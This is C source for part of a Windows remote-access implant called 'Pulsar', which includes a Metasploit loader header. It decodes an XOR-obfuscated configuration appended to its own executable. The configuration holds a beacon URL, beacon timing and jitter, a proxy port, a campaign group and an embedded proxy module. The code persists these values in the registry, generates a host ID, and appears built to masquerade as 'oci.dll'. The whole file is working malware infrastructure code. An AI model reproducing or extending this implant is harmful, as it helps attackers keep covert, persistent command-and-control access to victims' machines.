#include "PulsarInternal.h"
#include "PulsarLog.h"
#include "MetasploitLoader.h"
#include "Registry.h"


#include <stdlib.h>
#include <time.h>


#define RAND_LEN 8


//
// Given the config buffer, decode it, and
// assign all appropriate variables to the
// global vars structure
//
BOOL ProcessConfig(PUCHAR buffer,DWORD dwBufSize){
  PUCHAR bufPtr = buffer;
  DWORD dwTemp;

  //Decode the Buffer
    DWORD cycles = dwBufSize / RAND_LEN;
	PUCHAR blockPtr = NULL;	

  //Second to last block of the buffer
	blockPtr = buffer + dwBufSize - ( 2 * RAND_LEN);

  //load up the last block
    bufPtr = buffer + dwBufSize - (RAND_LEN);

          for(DWORD i = 0; i < cycles; i++){
                  for(int j=0; j < RAND_LEN; j++){
                        bufPtr[j] = bufPtr [j] ^ blockPtr[j];
                  }
                  bufPtr-=RAND_LEN;
                  blockPtr-=RAND_LEN;
          }

  //Reset bufPtr
	bufPtr = buffer;

  //Now skip past the randomness
	bufPtr += RAND_LEN;

  //Now copy over the port
	memcpy(&pulsar_context->pulsarproxy_port,bufPtr,sizeof(unsigned short));
	bufPtr += (sizeof(unsigned short));
	DBGPrint("pulsar_context->pulsarproxy_port: %d\n",pulsar_context->pulsarproxy_port);  

  //The Beacon time
	memcpy(&pulsar_context->dwBeaconTime,bufPtr,sizeof(DWORD));
	bufPtr+= (sizeof(DWORD));
	DBGPrint("pulsar_context->dwBeaconTime: %d\n",pulsar_context->dwBeaconTime);

  //Jitter time
	memcpy(&pulsar_context->dwBeaconJitter,bufPtr,sizeof(DWORD));
	bufPtr += (sizeof(DWORD));

  //Size of URL
	memcpy(&dwTemp,bufPtr,sizeof(DWORD));
	bufPtr+= (sizeof(DWORD));

  //Allocate the space
	pulsar_context->beacon_url = (PCHAR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwTemp);
	if(!pulsar_context->beacon_url){
		return FALSE;
	}else{
		//Now read the beacon URL
		memcpy(pulsar_context->beacon_url,bufPtr,dwTemp);
		bufPtr+=dwTemp;
	}

  //Size of Group
	memcpy(&dwTemp,bufPtr,sizeof(DWORD));
	bufPtr+= (sizeof(DWORD));

  //Allocate the space
	pulsar_context->group = (PCHAR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwTemp);
	if(!pulsar_context->group){
		return FALSE;
	}else{
		//Now read the group
		memcpy(pulsar_context->group,bufPtr,dwTemp);
		bufPtr+=dwTemp;
	}


  //Size of the Proxy
	memcpy(&pulsar_context->dwProxySize,bufPtr,sizeof(DWORD));
	bufPtr+= (sizeof(DWORD));

  //Allocate space for the proxy
	pulsar_context->metaproxy = (PUCHAR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,pulsar_context->dwProxySize);
	if(!pulsar_context->metaproxy){
		HeapFree(GetProcessHeap(),0,pulsar_context->beacon_url);
		return FALSE;
	}

  //Read in the proxy
	memcpy(pulsar_context->metaproxy,bufPtr,pulsar_context->dwProxySize);

	DBGPrint("pulsar_context->dwBeaconJitter: %d\n",pulsar_context->dwBeaconJitter);
	DBGPrint("pulsar_context->beacon_url: %s\n",pulsar_context->beacon_url);
	DBGPrint("pulsar_context->group: %s\n",pulsar_context->group);
	DBGPrint("pulsar_context->dwProxySize: %d\n",pulsar_context->dwProxySize);

	return TRUE;
}

//
// Determine the size of a PE file by
// examining the NT Header
//
DWORD GetSizeOfPEFile(HANDLE hFile){
  BYTE buff[4096]; 
  DWORD read;

  DBGPrint("Called\n");

  //Read the DOS header
  if(!ReadFile(hFile, buff, sizeof(buff), &read, NULL)){
	  DBGPrint("Failed to read file\n");
	  return 0;
  }
	IMAGE_DOS_HEADER* dosheader = (IMAGE_DOS_HEADER*)buff;
	if(dosheader->e_magic != IMAGE_DOS_SIGNATURE){
	  DBGPrint("Invalid DOS header\n");
	 return 0;
    }
	if(ULONG(dosheader->e_lfanew) >= ULONG(sizeof(buff) - sizeof(IMAGE_NT_HEADERS))){
	  DBGPrint("Invalid DOS Header sizing\n");
	  return 0;
    }


  //Locate PE header
	IMAGE_NT_HEADERS* header = (IMAGE_NT_HEADERS*)(buff + dosheader->e_lfanew);
	if(header->Signature != IMAGE_NT_SIGNATURE){
	  DBGPrint("Invalid NT Signature\n");
	  return 0;
    }


	IMAGE_SECTION_HEADER* sectiontable =
		(IMAGE_SECTION_HEADER*)((BYTE*)header + sizeof(IMAGE_NT_HEADERS));
	if((BYTE*)sectiontable >= buff + sizeof(buff)){
	  DBGPrint("Incorrect Section Table sizing\n");
	  return 0;
    }
	DWORD maxpointer = 0, SizeOfPE = 0;

	// For each section
	for(int i = 0; i < header->FileHeader.NumberOfSections; ++i) {
		if(sectiontable->PointerToRawData > maxpointer) {
			maxpointer = sectiontable->PointerToRawData;
			SizeOfPE = sectiontable->PointerToRawData + sectiontable->SizeOfRawData;
		}
		sectiontable++;
	}


  return SizeOfPE;

}



//
// Generate a unique host ID in the form of a
// GUID. Store it in the global pulsar_context.
// We use a version 4 GUID.
//
VOID GenHostID(VOID){

	srand(time(NULL));
	int t = 0;
	char *szTemp = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";
	char *szHex = "0123456789ABCDEF-";
	int nLen = strlen (szTemp);

	for (t=0; t<nLen+1; t++)
	{
		int r = rand () % 16;
		char c = ' ';   

		switch (szTemp[t])
		{
			case 'x' : { c = szHex [r]; } break;
			case 'y' : { c = szHex [r & 0x03 | 0x08]; } break;
			case '-' : { c = '-'; } break;
			case '4' : { c = '4'; } break;
		}

		pulsar_context->GUID[t] = ( t < nLen ) ? c : 0x00;
	}

	DBGPrint("Host ID: %s\r\n", pulsar_context->GUID);

}


//
// Take all of our current Pulsar values and 
// store them into the registry, overwriting 
// anything already there.
//

BOOL WriteVarstoReg(VOID){
	DBGPrint("Called\n");

	
	//Open/Create the registry key we need
	//Check for registry key and create if its not there
	HKEY hKey;
	LONG lResult = RegCreateKeyEx(HKEY_LOCAL_MACHINE, VAR_STORE_KEY_SYS, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WRITE | KEY_SET_VALUE,
									NULL, &hKey, NULL);

	if (lResult != ERROR_SUCCESS) 
	{
		DBGPrint("Failed to open/create System Registry Key\n");
		hKey = NULL;

		//Now try the user based one
		    lResult = RegCreateKeyEx(HKEY_CURRENT_USER, VAR_STORE_KEY_USER, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WRITE | KEY_SET_VALUE,
			NULL, &hKey, NULL);

		if (lResult != ERROR_SUCCESS){
			DBGPrint("Failed to open/create User Registry Key\n");
			return FALSE;
		}
	}

	//Write GUID to Registry
	SetRegistryValueStr(hKey,"GUID",pulsar_context->GUID);

	//Write PulsarProxyPort
	SetRegistryValueNum(hKey,"ProxyPort",pulsar_context->pulsarproxy_port);

	//Write Beacon Time
	SetRegistryValueNum(hKey,"BeaconTime",pulsar_context->dwBeaconTime);

	//Write Beacon Jitter
	SetRegistryValueNum(hKey,"BeaconJitter",pulsar_context->dwBeaconJitter);

	//Write Beacon Host
	SetRegistryValueStr(hKey,"BeaconURL",pulsar_context->beacon_url);

	//Write Group
	SetRegistryValueStr(hKey,"Group",pulsar_context->group);

	//Write the Proxy module
	if(pulsar_context->dwProxySize > 0){
		SetRegistryValueBin(hKey,"proxy_mod",pulsar_context->metaproxy,pulsar_context->dwProxySize);
	}

	DBGPrint("Returning\n");


	RegCloseKey(hKey);

	return TRUE;
}

//
// Check to see if the VARS are in the registry, and if they are we load
// them up and return TRUE. Return FALSE otherwise.
//
BOOL VarsInReg(VOID){
	DBGPrint("Called\n");
	DWORD dwTempVal;

	//Open the variables registry key
	HKEY hKey;
	LONG lResult = RegOpenKeyEx (HKEY_CURRENT_USER, VAR_STORE_KEY_USER, 0, KEY_READ, &hKey);
	if (lResult != ERROR_SUCCESS) 
	{

		DBGPrint("Failed to open Vars Registry Key (User)\n");
		//Now try the system wide one
	  lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, VAR_STORE_KEY_SYS, 0, KEY_READ, &hKey);
		if (lResult != ERROR_SUCCESS)
		{

			DBGPrint("Failed to open Vars Registry Key (System)\n");
			return FALSE;
		}
	}

	//Read in the GUID
	if( GetRegistryValueStr(hKey,"GUID",pulsar_context->GUID,40) == FALSE){
		DBGPrint("Failed to read GUID\n");
		return FALSE;
	}

	//Read in the Proxy Port
	if(GetRegistryValueNum(hKey,"ProxyPort",&dwTempVal) == FALSE){
		DBGPrint("Failed to read Proxy Port\n");
		return FALSE;
	}
	pulsar_context->pulsarproxy_port = (USHORT)dwTempVal;
	
	//Read in Beacon Time
	if(GetRegistryValueNum(hKey,"BeaconTime",&pulsar_context->dwBeaconTime) == FALSE){
		DBGPrint("Failed to read Beacon Time\n");
		return FALSE;
	}

	//Read in Jitter
	if(GetRegistryValueNum(hKey,"BeaconJitter",&pulsar_context->dwBeaconJitter) == FALSE){
		DBGPrint("Failed to read Beacon Jitter\n");
		return FALSE;
	}


	//Size and value of the Beacon host
	dwTempVal = GetSizeOfRegistryStr(hKey,"BeaconURL");
	pulsar_context->beacon_url = (PCHAR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwTempVal);
	if(pulsar_context->beacon_url == NULL){
		DBGPrint("Failed to allocate Beacon URL\n");
		return FALSE;
	}

	if( GetRegistryValueStr(hKey,"BeaconURL",pulsar_context->beacon_url,dwTempVal) == FALSE){
		DBGPrint("Failed to read BeaconURL\n");
		return FALSE;
	}


	//Size and value of the group
	dwTempVal = GetSizeOfRegistryStr(hKey,"Group");
	pulsar_context->group = (PCHAR) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwTempVal);
	if(pulsar_context->group == NULL){
		DBGPrint("Failed to allocate Group\n");
		return FALSE;
	}

	if( GetRegistryValueStr(hKey,"Group",pulsar_context->group,dwTempVal) == FALSE){
		DBGPrint("Failed to read Group\n");
		return FALSE;
	}

	//Read in the PulsarProxy if there is one
	if(GetRegistryValueBin(hKey,"proxy_mod",pulsar_context->metaproxy,&pulsar_context->dwProxySize) == FALSE){
		DBGPrint("Failed to read in the proxy module\n");
		//Failure here is sometimes expected, so we don't return false
	}


	DBGPrint("Host ID: %s\r\n", pulsar_context->GUID);
	DBGPrint("pulsar_context->pulsarproxy_port: %d\n",pulsar_context->pulsarproxy_port); 
	DBGPrint("pulsar_context->dwBeaconTime: %d\n",pulsar_context->dwBeaconTime);
	DBGPrint("pulsar_context->dwBeaconJitter: %d\n",pulsar_context->dwBeaconJitter);
	DBGPrint("pulsar_context->beacon_url: %s\n",pulsar_context->beacon_url);
	DBGPrint("pulsar_context->group: %s\n",pulsar_context->group);
	DBGPrint("pulsar_context->dwProxySize: %d\n",pulsar_context->dwProxySize);



	DBGPrint("Returning\n");
	return TRUE;
}


//
// Load the variables that will be used for runnig Pulsar. They are given the 
// first time by catting a file to the end of the executable. After that we
// cache them in the registry. We first look there, and failing ot find values
// in the registry we look at our own binary. Once we have successfully loaded all
// values, we save them in the registry for ease of retrival and update.
//
BOOL LoadVars(VOID){
	DBGPrint("Called\n");

  CHAR lpFileName[256];
  UCHAR *lpConfig = NULL;

  //First check to see if we've cached the values in the
  //registry, if so we load and use those
  if(VarsInReg()){
	  DBGPrint("Loaded values from registry.\n");
	  return TRUE;
  }


  //We will need a GUID for ourselves
	GenHostID();

  //We want to have a handle referencing our current
  //module. First we try oci.dll, if it works, then we know we
  //are running as it, if now we just use a NULL value and
  //grab the value of the currently running process
	HMODULE myMod = GetModuleHandle("oci.dll");


  //Get our current file name
    memset(lpFileName,0,256);
    GetModuleFileName(myMod,lpFileName,256);
	DBGPrint("Loading config from: %s\n",lpFileName);

   //Get a handle to ourselfes
	HANDLE hFile = CreateFile((CHAR*)lpFileName, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if(INVALID_HANDLE_VALUE == hFile){
		DBGPrint("Can't open %s\n",lpFileName);
		return FALSE;
	}

  //Get our current file size
	DWORD dwFileSize = GetFileSize(hFile,NULL);
	DBGPrint("File is %d bytes\n",dwFileSize);

  //Now see how big the exe portion is
    DWORD dwExeSize = GetSizeOfPEFile(hFile);
	DBGPrint("The EXE portion is %d bytes\n",dwExeSize);

	if (dwExeSize > dwFileSize) {
		DBGPrint("EXE size is larger than entire file\n");
		CloseHandle(hFile);
		return FALSE;
	}

  //How big are the VARS?
	DWORD dwVarsSize = dwFileSize - dwExeSize;
	DBGPrint("The vars are %d bytes\n",dwVarsSize);
	if(dwVarsSize == 0){
		DBGPrint("No Vars attached\n");
		CloseHandle(hFile);
		return FALSE;
	}

  //Allocate memory for the config
	lpConfig = (PUCHAR)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwVarsSize);
	if(!lpConfig){
		DBGPrint("Failed to allocate\n");
		CloseHandle(hFile);
		return FALSE;
	}

  //Read the config file data
  if(SetFilePointer(hFile, dwExeSize , NULL, FILE_BEGIN)  == INVALID_SET_FILE_POINTER){
	  DBGPrint("Failed to set file pointer\n");
	  CloseHandle(hFile);
	  HeapFree(GetProcessHeap(),0,lpConfig);
	  return FALSE;
  }

  //Read the file contents
  DWORD dwBytesRead;
  if(ReadFile(hFile,lpConfig,dwVarsSize,&dwBytesRead,NULL) == FALSE){
	  DBGPrint("Failed to read file\n");
	  CloseHandle(hFile);
	  HeapFree(GetProcessHeap(),0,lpConfig);
	  return FALSE;
  }

  DBGPrint("Read %d bytes of config\n",dwBytesRead);

  //Process it
  if(ProcessConfig(lpConfig,dwBytesRead) == FALSE){
	  DBGPrint("Failed to process the config file\n");
	  CloseHandle(hFile);
	  HeapFree(GetProcessHeap(),0,lpConfig);
	  return FALSE;
  }



  //Free the config
	HeapFree(GetProcessHeap(),0,lpConfig);
	
  //Write the Vars to the registry
	WriteVarstoReg();

  //Close the handle
	CloseHandle(hFile);

	DBGPrint("Returning\n");

	return TRUE;  //If we return here, all was successful
}